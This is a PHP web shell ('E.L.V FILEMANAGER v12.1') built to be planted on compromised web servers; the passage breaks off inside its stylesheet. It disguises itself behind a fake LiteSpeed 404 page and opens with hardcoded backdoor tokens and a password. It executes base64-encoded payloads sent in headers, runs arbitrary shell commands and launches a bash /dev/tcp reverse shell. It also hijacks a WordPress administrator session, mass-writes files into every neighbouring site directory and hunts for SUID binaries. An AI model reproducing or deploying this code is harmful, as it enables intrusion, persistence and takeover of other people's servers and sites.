<?php
@ob_start();
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
@session_start();
@error_reporting(0);
@set_time_limit(0);

/**
 * PROJECT    : E.L.V FILEMANAGER v12.1
 * AUTHOR      : HxN@E.L.V
 * Telegram     : @HxNoname
 * STATUS       : READY TO ROCK N ROLL IN NEON NIGHTS!!
*/

// ==========================================
// --- 1. CORE LOGIC & AUTO-REGISTER WRAPPER ---
// ==========================================
if(!class_exists('ELV_Stream_Wrapper')){
    class ELV_Stream_Wrapper {
        private $pos = 0;
        private $data = '';
        public function stream_open($p, $m, $o, &$op) { 
            $this->data = isset($GLOBALS['_ELV_MEM_PAYLOAD']) ? $GLOBALS['_ELV_MEM_PAYLOAD'] : ''; 
            return true; 
        }
        public function stream_read($c) { 
            $r = substr($this->data, $this->pos, $c); 
            $this->pos += strlen($r); 
            return $r; 
        }
        public function stream_eof() { 
            return $this->pos >= strlen($this->data); 
        }
        public function stream_stat() { return []; }
        public function url_stat($a,$b) { return []; }
    }
}
if(!in_array('elvmem', stream_get_wrappers())){ 
    @stream_wrapper_register('elvmem', 'ELV_Stream_Wrapper'); 
}

// --- EKSEKUSI STEALTH FULL AUTO (API MODE) ---
$api_payload = '';
if (isset($_SERVER['HTTP_X_ELV_RUN'])) { 
    $api_payload = @base64_decode($_SERVER['HTTP_X_ELV_RUN']); 
} elseif (isset($_REQUEST['elv_run'])) { 
    $api_payload = @base64_decode($_REQUEST['elv_run']); 
}

if (!empty($api_payload)) {
    if(strpos($api_payload, '<?') === false) { 
        $api_payload = "<?php\n" . $api_payload; 
    }
    $GLOBALS['_ELV_MEM_PAYLOAD'] = $api_payload;
    ob_start();
    @include('elvmem://run');
    $api_out = ob_get_clean();
    die($api_out); 
}

// ==========================================
// --- 2. SECRET KEY ANTI-BOT & TACTICAL BYPASS ---
// ==========================================
if (isset($_SERVER['HTTP_X_AUTH_TOKEN']) && $_SERVER['HTTP_X_AUTH_TOKEN'] === 'WHY-ALWAYS-ME') {
    $_SESSION['shell_unlocked'] = true;
    $_SESSION['elv_logged_in'] = true;
    @setcookie('Greetings', 'Noname@ELV', time() + (86400 * 30), "/");
}

if (!isset($_SESSION['shell_unlocked'])) {
    if (isset($_GET['id']) && $_GET['id'] === '@elv') {
        $_SESSION['shell_unlocked'] = true;
        if (isset($_POST['cmd']) || isset($_FILES['u_f']) || isset($_GET['action']) || isset($_POST['mass_deploy'])) {
            $_SESSION['elv_logged_in'] = true; 
        }
        header("Location: ?");
        exit;
    } else {
        header("HTTP/1.1 404 Not Found");
        echo '<!DOCTYPE html><html style="height:100%"><head><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /><title>404 Not Found</title><style>body{color:#444;margin:0;font:normal 14px/20px Arial,Helvetica,sans-serif;height:100%;background-color:#fff}.wrap{min-height:100%;position:relative}.content{text-align:center;width:100%;max-width:800px;margin:0 auto;position:absolute;top:30%;left:50%;transform:translateX(-50%)}h1{margin:0;font-size:120px;line-height:120px;font-weight:bold;color:#444}h2{margin-top:20px;font-size:30px;color:#444}p{color:#444}.footer{color:#f0f0f0;font-size:12px;padding:15px 30px;position:absolute;bottom:0;width:100%;box-sizing:border-box;background-color:#474747;border-top:1px solid rgba(0,0,0,0.15)}.footer a{color:#fff;text-decoration:none}@media(min-width:768px){h1{font-size:150px;line-height:150px}}</style></head><body><div class="wrap"><div class="content"><h1>404</h1><h2>Not Found</h2><p>The resource requested could not be found on this server!</p></div></div><div class="footer"><br>Proudly powered by <a href="http://www.litespeedtech.com/error-page">LiteSpeed Web Server</a><p style="margin:5px 0 0 0;color:#f0f0f0;">Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p></div></body></html>';
        exit;
    }
}

// ==========================================
// --- 3. KONFIGURASI AUTH LOGIN & COOKIE ---
// ==========================================
$auth_pass = "MrHaxorN0N4M3@ELV";

$inner_bg  = "https://j.top4top.io/p_3778w2fza0.png"; 

// --- DOWNLOAD ACTION LOGIC ---
if (isset($_GET['download'])) {
    $file_to_download = $_GET['download'];
    if (file_exists($file_to_download) && is_file($file_to_download)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file_to_download).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_to_download));
        readfile($file_to_download);
        exit;
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    setcookie('Greetings', '', time() - 3600, "/");
    header("Location: ?");
    exit;
}

if (isset($_POST['l_pass'])) {
    if ($_POST['l_pass'] === $auth_pass) {
        $_SESSION['elv_logged_in'] = true;
        setcookie('Greetings', 'Noname@ELV', time() + (86400 * 30), "/"); 
        header("Location: ?");
        exit;
    } else {
        $login_err = "ACCESS DENIED: SECURITY BREACH DETECTED";
    }
}

$is_logged_in = false;
if ((isset($_SESSION['elv_logged_in']) && $_SESSION['elv_logged_in'] === true) || (isset($_COOKIE['Greetings']) && $_COOKIE['Greetings'] === 'Noname@ELV')) {
    $is_logged_in = true;
    if (!isset($_SESSION['elv_logged_in'])) $_SESSION['elv_logged_in'] = true; 
}

// ==========================================
// --- 4. SCRIPT BACKGROUND TERMINAL ---
// ==========================================
$bg_terminal_js = "
    const canvasBg = document.getElementById('terminal-bg');
    const ctxBg = canvasBg.getContext('2d');
    canvasBg.width = window.innerWidth;
    canvasBg.height = window.innerHeight;
    const logsData = [
        'root@elv:~# apt-get update && apt-get upgrade -y',
        'root@elv:~# systemctl restart apache2',
        'root@elv:~# tail -f /var/log/apache2/access.log',
        '[ OK ] Connection established to remote host.',
        'root@elv:~# netstat -tulpn | grep LISTEN',
        'tcp        0      0 0.0.0.0:80              0.0.0.0:* LISTEN',
        'tcp        0      0 0.0.0.0:443             0.0.0.0:* LISTEN',
        '[*] Bypassing WAF security layers... [SUCCESS]',
        '[+] Payload tactical-shell.php deployed successfully.',
        'root@elv:~# id',
        'uid=0(root) gid=0(root) groups=0(root)',
        'root@elv:~# uname -a',
        'Linux elv-mainframe 5.15.0-kali3-amd64 #1 SMP Debian 5.15.15-1kali1 x86_64 GNU/Linux',
        'root@elv:~# ./exploit.sh --target 192.168.1.100',
        '[!] INTRUSION DETECTED: OVERRIDING PROTOCOL...',
        'root@elv:~# clear'
    ];
    const logColors = ['#0ff', '#f0f', '#ff003c', '#0f0', '#ffd700', '#0ff'];
    let currentLogs = [];
    let maxLines = Math.floor(canvasBg.height / 22);
    let startLines = Math.floor(maxLines / 1.2); 
    for(let i = 0; i < startLines; i++) {
        let text = logsData[Math.floor(Math.random() * logsData.length)];
        let color = logColors[Math.floor(Math.random() * logColors.length)];
        currentLogs.push({t: text, c: color});
    }
    function addLogBg() {
        if (currentLogs.length > maxLines) { currentLogs.shift(); }
        let text = logsData[Math.floor(Math.random() * logsData.length)];
        let color = logColors[Math.floor(Math.random() * logColors.length)];
        currentLogs.push({t: text, c: color});
    }
    setInterval(() => {
        ctxBg.clearRect(0, 0, canvasBg.width, canvasBg.height);
        ctxBg.font = 'bold 13px monospace';
        for (let i = 0; i < currentLogs.length; i++) { 
            ctxBg.fillStyle = currentLogs[i].c;
            ctxBg.shadowBlur = 8;
            ctxBg.shadowColor = currentLogs[i].c;
            ctxBg.fillText(currentLogs[i].t, 15, 30 + (i * 22)); 
            ctxBg.shadowBlur = 0; 
        }
        if (Math.random() > 0.4) { addLogBg(); }
    }, 350);
    window.addEventListener('resize', () => { 
        canvasBg.width = window.innerWidth; 
        canvasBg.height = window.innerHeight; 
        maxLines = Math.floor(canvasBg.height / 22);
        ctxBg.clearRect(0, 0, canvasBg.width, canvasBg.height);
    });
";

$target_host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'UNKNOWN_HOST';
$host_for_ip = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
$server_ip   = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : gethostbyname($host_for_ip);
$client_ip   = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'UNKNOWN_IP';
$os_info     = php_uname('s') . ' ' . php_uname('m');
$php_version = phpversion();

if (!$is_logged_in) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="secret-id" content="[ Dev HxrNoname © | E.L.V Engine ® ]">
        <title>NONAME@E.L.V | AUTHENTICATION REQUIRED</title>
        <style>
        /* Force selection for CodeMirror */
.CodeMirror, .CodeMirror-scroll, .CodeMirror-sizer, .CodeMirror-lines {
    user-select: text !important;
    -webkit-user-select: text !important;
    -moz-user-select: text !important;
    -ms-user-select: text !important;
}

/* Matikan backdrop-filter saat mengedit, karena kadang bikin glitch di selection */
.container {
    backdrop-filter: none !important;
}
            @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
            :root { --cyan: #00fff7; --magenta: #ff00aa; --blue: #0044ff; --dark: #0a0a0f; }
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { background: var(--dark); color: var(--cyan); font-family: 'Share Tech Mono', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
            #terminal-bg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 0; opacity: 0.15; }
            .scanline { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,247,0.03) 2px, rgba(0,255,247,0.03) 4px); pointer-events: none; z-index: 1; }
            .cyber-frame { width: 92%; max-width: 620px; padding: 2px; background: linear-gradient(135deg, var(--cyan), var(--magenta)); border-radius: 6px; box-shadow: 0 0 40px rgba(0,255,247,0.3), 0 0 80px rgba(255,0,170,0.15); position: relative; z-index: 2; }
            .inner-terminal { background: rgba(7,7,15,0.97); border-radius: 4px; padding: 30px 25px; display: flex; flex-direction: column; align-items: center; border: 1px solid rgba(0,255,247,0.15); }
            .ascii-box { border: 1px solid var(--cyan); padding: 20px; margin: 0 auto 15px; display: inline-block; box-shadow: 0 0 20px rgba(0,255,247,0.2), inset 0 0 15px rgba(0,255,247,0.1); width: 100%; text-align: center; }
            .ascii-logo { color: var(--cyan); text-shadow: 0 0 15px var(--cyan), 0 0 30px var(--cyan); font-size: 7px; text-align: center; font-weight: 700; line-height: 1.15; margin: 0; letter-spacing: 0; }
            .ascii-box {
    overflow-x: auto; /* Scroll horizontal kalau ASCII kepanjangan */
    max-width: 100%;
}
            .term-output { font-size: 14px; line-height: 1.8; margin-bottom: 18px; color: var(--cyan); font-weight: 400; width: 100%; min-height: 120px; }
            .cyan-text { color: var(--cyan); text-shadow: 0 0 8px var(--cyan); }
            .magenta-text { color: var(--magenta); text-shadow: 0 0 8px var(--magenta); }
            .gold-text { color: #ffd700; text-shadow: 0 0 10px #ffd700; }
            #login-form { display: none; margin-top: 10px; border-top: 1px solid rgba(0,255,247,0.2); padding-top: 20px; animation: slideUp 0.4s ease-out; width: 100%; }
            @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
            .input-group { display: flex; align-items: center; margin-bottom: 15px; background: rgba(0,255,247,0.04); border: 1px solid rgba(0,255,247,0.4); border-left: 4px solid var(--cyan); padding: 12px 15px; transition: all 0.3s; }
            .input-group:focus-within { background: rgba(0,255,247,0.08); border-color: var(--cyan); border-left: 4px solid var(--magenta); box-shadow: 0 0 20px rgba(0,255,247,0.1); }
            .prompt { color: var(--cyan); margin-right: 12px; font-weight: 700; white-space: nowrap; font-size: 15px; text-shadow: 0 0 5px var(--cyan); }
            input { background: transparent; border: none; color: var(--cyan); font-family: 'Share Tech Mono', monospace; font-size: 16px; width: 100%; padding: 5px; outline: none; letter-spacing: 2px; }
            input:focus { text-shadow: 0 0 10px var(--cyan); }
            input::placeholder { color: rgba(0,255,247,0.25); letter-spacing: 2px; }
            button { width: 100%; padding: 14px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); font-family: 'Share Tech Mono', monospace; font-size: 16px; cursor: pointer; transition: all 0.3s; text-transform: uppercase; letter-spacing: 4px; font-weight: 700; text-shadow: 0 0 5px var(--cyan); position: relative; overflow: hidden; }
            button::after { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(0,255,247,0.2), transparent); transition: 0.5s; }
            button:hover::after { left: 100%; }
            button:hover { background: rgba(0,255,247,0.1); color: #fff; box-shadow: 0 0 30px var(--cyan), inset 0 0 10px var(--cyan); border-color: var(--magenta); text-shadow: 0 0 12px #fff; }
            .term-error { color: var(--magenta); font-weight: 700; margin-bottom: 15px; border: 1px solid var(--magenta); padding: 12px; text-align: center; background: rgba(255,0,170,0.1); font-size: 13px; text-transform: uppercase; letter-spacing: 1px; box-shadow: 0 0 20px rgba(255,0,170,0.3); width: 100%; }
            .cursor { display: inline-block; width: 10px; height: 18px; background: var(--cyan); animation: blink 1s step-end infinite; vertical-align: middle; margin-left: 8px; box-shadow: 0 0 10px var(--cyan); }
            @keyframes blink { 50% { opacity: 0; } }
            @media (max-width: 600px) { .ascii-logo { font-size: 4px; } .ascii-box { padding: 12px; } .inner-terminal { padding: 20px 15px; } }
        </style>
    </head>
    <body>
        <canvas id="terminal-bg"></canvas>
        <div class="scanline"></div>
        <div class="cyber-frame">
            <div class="inner-terminal">
                <div class="ascii-box">
                    <div class="ascii-logo">
<pre style="margin:0; line-height:1.15; font-weight:700;">
███████╗██╗    ██╗   ██╗    ███████╗███╗   ███╗    ██╗   ██╗ ██╗██████╗     ██████╗ 
██╔════╝██║    ██║   ██║    ██╔════╝████╗ ████║    ██║   ██║███║╚════██╗   ██╔═████╗
█████╗  ██║    ██║   ██║    █████╗  ██╔████╔██║    ██║   ██║╚██║ █████╔╝   ██║██╔██║
██╔══╝  ██║    ╚██╗ ██╔╝    ██╔══╝  ██║╚██╔╝██║    ╚██╗ ██╔╝ ██║ ╚═══██╗   ████╔╝██║
███████╗███████╗╚████╔╝     ██║██╗  ██║ ╚═╝ ██║     ╚████╔╝  ██║██████╔╝██╗╚██████╔╝
╚══════╝╚══════╝ ╚═══╝      ╚═╝╚═╝  ╚═╝     ╚═╝      ╚═══╝   ╚═╝╚═════╝ ╚═╝ ╚════</pre>
                    </div>
                </div>
                <div class="term-output" id="term-text"></div>
                <?php if(isset($login_err)) echo "<div class='term-error'>[!] $login_err [!]</div>"; ?>
                <form id="login-form" method="POST">
                    <div class="input-group">
                        <span class="prompt">access_key:~#</span>
                        <input type="password" name="l_pass" placeholder="SECRET KEY" required autofocus>
                    </div>
                    <button type="submit">[ INITIATE CONNECTION ]</button>
                </form>
            </div>
        </div>
        <script>
            <?= $bg_terminal_js ?>
            const termText = document.getElementById("term-text"); const loginForm = document.getElementById("login-form"); const hasError = <?php echo isset($login_err) ? 'true' : 'false'; ?>; const sleep = ms => new Promise(r => setTimeout(r, ms));
            async function bootSequence() {
                if(hasError) { termText.innerHTML = "<div><span class='cyan-text'>[sys]</span> Auth token rejected.</div><div><span class='magenta-text'>[!] INITIATING DEFENSIVE PROTOCOL</span></div>"; loginForm.style.display = "block"; return; }
                const seq = [
                    { t: "<span class='cyan-text'>[*]</span> Establishing secure connection to <?= htmlspecialchars($target_host) ?>...", d: 10 },
                    { t: "<span class='cyan-text'>[*]</span> Target IP resolved: <?= htmlspecialchars($server_ip) ?>", d: 10 },
                    { t: "<span class='cyan-text'>[*]</span> Kernel architecture: <?= htmlspecialchars($os_info) ?>", d: 10 },
                    { t: "<span class='cyan-text'>[*]</span> Bypassing WAF configurations... [SUCCESS]", d: 15 },
                    { t: "<span class='cyan-text'>[*]</span> Mounting encrypted volumes...", d: 10 },
                    { t: "<span class='gold-text'>[!]</span> AUTHENTICATION REQUIRED TO ACCESS MAINFRAME.<span class='cursor'></span>", d: 0 }
                ];
                for (let i = 0; i < seq.length; i++) { let row = document.createElement("div"); row.style.marginBottom = "5px"; termText.appendChild(row);
                    if (seq[i].t.includes("<span")) { row.innerHTML = seq[i].t; await sleep(150); } else { for (let char of seq[i].t) { row.innerHTML += char; await sleep(seq[i].d); } await sleep(50); } }
                loginForm.style.display = "block";
            }
            window.onload = bootSequence; 
        </script>
    </body>
    </html>
    <?php exit;
}

// ================= EFFECTIVENESS INJECTION: safeName =================
if (!function_exists('safeName')) {
    function safeName($name) {
        return preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $name);
    }
}

// ==========================================
// --- 5. INTERNAL UI MANAGER ---
// ==========================================
@ini_set('display_errors', 0);
@ini_set('safe_mode', 0);
@ini_set('disable_functions', 'none');

$logo_inner = "https://j.top4top.io/p_3829bo8yg0.png";
$elv_icon = "https://e.top4top.io/p_3767wkybq0.png";
$base_shell = dirname(__FILE__);

$dir = (isset($_GET['d'])) ? realpath($_GET['d']) : $base_shell;
if (!$dir || !is_dir($dir)) { $dir = $base_shell; }

// --- REVERSE SHELL EXECUTION LOGIC ---
if (isset($_POST['launch_rev'])) {
    $ip = $_POST['rev_ip'];
    $port = $_POST['rev_port'];
    $cmd = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &";
    @shell_exec($cmd);
    $status_msg = "REVERSE CONNECTION DISPATCHED TO $ip:$port";
}

// --- LOGIKA WP BYPASS EXECUTION ---
if (isset($_GET['action']) && $_GET['action'] == 'wp_bypass') {
    $wp_load_path = $dir . '/wp-load.php';
    if (file_exists($wp_load_path)) {
        require_once($wp_load_path);
        $admin_users = get_users(['role' => 'administrator', 'number' => 1]);
        if (!empty($admin_users)) {
            $admin = $admin_users[0];
            wp_set_current_user($admin->ID, $admin->user_login);
            wp_set_auth_cookie($admin->ID);
            do_action('wp_login', $admin->user_login, $admin);
            echo "<script>alert('[+] Target Compromised!\\nLogin sukses sebagai Administrator: {$admin->user_login}'); window.location.href='" . admin_url() . "';</script>";
            exit;
        } else {
            $status_msg = "BYPASS FAILED: No Admin Users found in Database.";
        }
    } else {
        $status_msg = "BYPASS FAILED: wp-load.php not found in this sector.";
    }
}

// --- COPY & PASTE LOGIC ---
if (isset($_POST['copy_f'])) {
    $_SESSION['copy_file'] = $_POST['c_path'];
    $status_msg = "[+] TACTICAL COPY: [ " . basename($_POST['c_path']) . " ] STORED IN MEMORY";
}
if (isset($_POST['paste_f'])) {
    if (isset($_SESSION['copy_file']) && file_exists($_SESSION['copy_file'])) {
        $src = $_SESSION['copy_file'];
        $dest = $dir . '/' . basename($src);
        if (copy($src, $dest)) {
            $status_msg = "[+] TACTICAL PASTE: [ " . basename($_SESSION['copy_file']) . " ] DEPLOYED TO SECTOR";
            unset($_SESSION['copy_file']); 
        } else {
            $status_msg = "FAILED: COULD NOT DEPLOY FILE";
        }
    }
}

$status_msg = (isset($status_msg)) ? $status_msg : "";
if (isset($_POST['save_f'])) { if(@file_put_contents($_POST['f_path'], $_POST['f_cnt'])) $status_msg = "[+] OVERRIDE SUCCESS: PAYLOAD [ " . basename($_POST['f_path']) . " ] INJECTED & SAVED"; }
if (isset($_FILES['u_f'])) { if(@move_uploaded_file($_FILES['u_f']['tmp_name'], $dir.'/'.$_FILES['u_f']['name'])) $status_msg = "[+] UPLOAD SUCCESS: PAYLOAD [ " . $_FILES['u_f']['name'] . " ] DEPLOYED STEALTHILY"; }
if (isset($_GET['del'])) { $t = $_GET['del']; if(is_dir($t) ? @rmdir($t) : @unlink($t)) $status_msg = "[-] WIPE SUCCESS: TARGET [ " . basename($t) . " ] TERMINATED & ERASED"; }
if (isset($_POST['mk_f'])) { if(@file_put_contents($dir.'/'.$_POST['f_n'], "")) $status_msg = "[+] FILE CREATED: [ " . $_POST['f_n'] . " ] ESTABLISHED"; }
if (isset($_POST['mk_d'])) { 
    $safe_dir = safeName($_POST['d_n']);
    if(@mkdir($dir.'/'.$safe_dir)) $status_msg = "[+] SECTOR CREATED: DIR [ " . $safe_dir . " ] ESTABLISHED"; 
}
if (isset($_POST['rename'])) { if(@rename($_POST['old'], $dir.'/'.$_POST['new'])) $status_msg = "[+] RENAME SUCCESS: [ " . basename($_POST['old']) . " ] ALTERED TO [ " . basename($_POST['new']) . " ]"; }
if(isset($_POST['unzip_f'])) {
    $zip_file = $_POST['c_path'];
    $zip = new ZipArchive;
    if ($zip->open($zip_file) === TRUE) {
        $zip->extractTo($dir);
        $zip->close();
        echo "<script>alert('UNZIP SUCCESS!'); window.location='?d=".urlencode($dir)."';</script>";
    } else {
        echo "<script>alert('FAILED TO UNZIP!');</script>";
    }
}
if (isset($_POST['ch_mod'])) { if(@chmod($_POST['c_path'], octdec($_POST['c_perm']))) $status_msg = "[+] CHMOD SUCCESS: PRIVILEGE FOR [ " . basename($_POST['c_path']) . " ] UPDATED TO [ " . $_POST['c_perm'] . " ]"; }

if (isset($_POST['mass_deploy'])) {
    $target_root = $_POST['target_root'];
    $file_name = $_POST['mass_name'];
    $content = $_POST['mass_content'];
    $count = 0; // Inisialisasi awal
    $injected_targets = [];

    if (is_dir($target_root)) {
        $folders = scandir($target_root);
        foreach ($folders as $folder) {
            $path = $target_root . '/' . $folder;
            if ($folder != '.' && $folder != '..' && is_dir($path)) {
                if (@file_put_contents($path . '/' . $file_name, $content)) {
                    $count++;
                    $injected_targets[] = "[+] " . $folder . " -> " . $file_name;
                }
            }
        }
        
        $status_msg = "SUCCESS: $count SECTORS INJECTED";
        
        // Output hasil yang bersih
        if ($count > 0) {
            $result_text = implode("\n", $injected_targets);
            $status_msg .= "<br><br><b style='color:var(--magenta);'>[ RESULT MASS DEPLOY ]</b><br>";
            $status_msg .= "<textarea style='width:100%; height:200px; margin-top:10px; background:rgba(0,0,0,0.8); border:1px solid var(--cyan); color:var(--cyan); font-family:monospace; padding:10px; resize:vertical;' readonly>" . htmlspecialchars($result_text) . "</textarea>";
        }
    } else {
        $status_msg = "ERROR: TARGET ROOT NOT FOUND!";
    }
}

$u_info = @get_current_user();
if (function_exists('posix_getpwuid')) { 
    $uid = @posix_getpwuid(@posix_geteuid()); 
    if($uid) $u_info = $uid['name'] . " (" . $uid['uid'] . ")"; 
}
$s_soft = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'UNKNOWN';
$s_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'UNKNOWN';
$php_v = phpversion();
$kernel = php_uname('r');
$uuid_raw = @file_get_contents('/etc/machine-id');
$uuid = $uuid_raw ? substr(trim($uuid_raw), 0, 18).'...' : 'LOCKED';

$dis_func_raw = @ini_get('disable_functions');
$dis_func = $dis_func_raw ? $dis_func_raw : 'NONE (BYPASSED)';

$out = "";
if (isset($_GET['autoroot']) && $_GET['autoroot'] == 'exec') {
    $out = "[[ E.L.V AUTOMATED ROOT ENGINE v1.0 ]]\n";
    $out .= "[*] SYSTEM: " . php_uname() . "\n";
    $suids = shell_exec("find / -perm -4000 -type f 2>/dev/null | head -n 10");
    $out .= $suids ? $suids : "[-] No SUID found.\n";
}

if (isset($_POST['cmd'])) { 
    @chdir($dir);
    $out = @shell_exec($_POST['cmd']." 2>&1"); 
}

function formatSize($bytes) {
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NONAME@E.L.V | FILEMANAGER v12.1 CYBERPUNK DARK</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/theme/dracula.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        /* ================================================================ */
/*  SWAY CYBERPUNK NEON — r/unixporn EDITION                       */
/*  Author : NONAME@E.L.V                                          */
/*  Style  : Hyper Dark + Neon Glitch + Disco Navigation           */
/* ================================================================ */

@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono:wght@400;700&display=swap');

:root {
    /* Core Backgrounds */
    --bg-deep:        #0b0b10;
    --bg-surface:     #111118;
    --bg-card:        #16161f;
    --bg-hover:       #1c1c2a;
    
    /* Neon Palette — Sway Cyberpunk */
    --neon-cyan:      #00f0ff;
    --neon-magenta:   #ff00aa;
    --neon-yellow:    #ffea00;
    --neon-green:     #00ff88;
    --neon-red:       #ff003c;
    --neon-orange:    #ff6600;
    --neon-blue:      #3366ff;
    --neon-purple:    #aa00ff;
    
    /* Text */
    --text-primary:   #e0e0ff;
    --text-secondary: #8888bb;
    --text-dim:       #55557a;
    
    /* Borders */
    --border-subtle:  #1e1e35;
    --border-neon:    #00f0ff;
    
    /* Glow intensities */
    --glow-cyan:      0 0 12px rgba(0, 240, 255, 0.4);
    --glow-magenta:   0 0 12px rgba(255, 0, 170, 0.4);
    --glow-yellow:    0 0 12px rgba(255, 234, 0, 0.4);
}

* { box-sizing: border-box; }

html, body {
    overflow-x: hidden;
    width: 100%;
    max-width: 100vw;
}

body {
    background: var(--bg-deep);
    color: var(--text-primary);
    font-family: 'Share Tech Mono', 'Courier New', monospace;
    margin: 0;
    padding: 16px;
    font-size: 14px;           /* ← Teks diperbesar */
    line-height: 1.5;
}

/* CRT Scanline Overlay */
body::after {
    content: '';
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: repeating-linear-gradient(
        0deg,
        transparent,
        transparent 2px,
        rgba(0, 240, 255, 0.015) 2px,
        rgba(0, 240, 255, 0.015) 4px
    );
    pointer-events: none;
    z-index: 9999;
}

/* Subtle radial vignette */
body::before {
    content: '';
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: radial-gradient(ellipse at 50% 30%, transparent 40%, rgba(0,0,0,0.7) 100%);
    pointer-events: none;
    z-index: 9998;
}

#terminal-bg {
    position: fixed;
    top: 0; left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 0;
    opacity: 0.07;
}

/* ================================================================ */
/*  MAIN CONTAINER                                                  */
/* ================================================================ */

.container {
    background: var(--bg-surface);
    border: 1px solid var(--border-subtle);
    padding: 24px;
    box-shadow: 0 0 60px rgba(0,0,0,0.9), inset 0 0 80px rgba(0,0,0,0.4);
    border-radius: 8px;
    margin: 0 auto;
    width: 100%;
    max-width: 1440px;
    position: relative;
    z-index: 2;
    backdrop-filter: blur(4px);
}

/* ================================================================ */
/*  HEADER + BRAND                                                  */
/* ================================================================ */

.header {
    display: flex;
    align-items: center;
    border-bottom: 1px solid var(--border-subtle);
    padding-bottom: 18px;
    margin-bottom: 18px;
    justify-content: space-between;
    flex-wrap: nowrap;
}

.header-brand {
    display: flex;
    align-items: center;
    gap: 18px;
}

.logo {
    width: 72px;
    height: 72px;
    border: 2px solid var(--neon-cyan);
    border-radius: 50%;
    box-shadow: var(--glow-cyan);
}

.brand pre {
    color: var(--neon-cyan);
    font-size: 6.5px;          /* ASCII lebih besar */
    line-height: 1.2;
    margin: 0;
    font-weight: 700;
    text-shadow: 0 0 10px var(--neon-cyan);
}

.brand small {
    color: var(--text-secondary);
    letter-spacing: 4px;
    font-size: 13px;
    text-transform: uppercase;
    display: block;
    margin-top: 8px;
}

/* Logout Button */
.btn-logout-top {
    background: transparent;
    color: var(--neon-red);
    text-decoration: none;
    font-weight: 700;
    padding: 12px 22px;
    border-radius: 4px;
    font-size: 14px;
    border: 2px solid var(--neon-red);
    box-shadow: 0 0 12px rgba(255,0,60,0.25);
    white-space: nowrap;
    transition: all 0.3s ease;
}

.btn-logout-top:hover {
    background: rgba(255,0,60,0.12);
    box-shadow: 0 0 30px var(--neon-red);
    transform: scale(1.04);
}

/* ================================================================ */
/*  HUD GRID — System Info                                         */
/* ================================================================ */

.hud-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
    gap: 12px;
    background: rgba(0,0,0,0.4);
    border: 1px solid var(--border-subtle);
    padding: 18px;
    border-radius: 6px;
    margin-bottom: 18px;
}

.hud-item {
    background: rgba(0,0,0,0.5);
    padding: 12px;
    border: 1px solid rgba(0,240,255,0.12);
    border-radius: 4px;
    text-align: center;
    font-size: 13px;           /* Teks HUD diperbesar */
    color: var(--text-secondary);
    transition: border-color 0.3s;
}

.hud-item:hover {
    border-color: var(--neon-cyan);
    box-shadow: var(--glow-cyan);
}

.hud-item b {
    color: var(--neon-cyan);
    display: block;
    margin-bottom: 6px;
    font-size: 13px;
    text-shadow: 0 0 6px var(--neon-cyan);
    letter-spacing: 1px;
}

/* ================================================================ */
/*  ALERT NOTIFICATION                                              */
/* ================================================================ */

.alert {
    background: rgba(0,240,255,0.06);
    border: 1px solid var(--neon-cyan);
    color: var(--neon-cyan);
    padding: 14px;
    margin-bottom: 18px;
    text-align: center;
    border-radius: 4px;
    font-size: 14px;           /* Alert diperbesar */
    box-shadow: var(--glow-cyan);
}

/* ================================================================ */
/*  NAVIGATION PANEL — DISCO JEDAG-JEDUG NEON                      */
/* ================================================================ */

.elv-neon-panel {
    background: rgba(0,0,0,0.55);
    border: 1px solid var(--border-subtle);
    border-radius: 8px;
    padding: 18px;
    margin-bottom: 24px;
    box-shadow: 0 0 30px rgba(0,0,0,0.8);
    position: relative;
    overflow: hidden;
}

/* Animated border glow — disco cycling */
.elv-neon-panel::before {
    content: '';
    position: absolute;
    top: -1px; left: -1px;
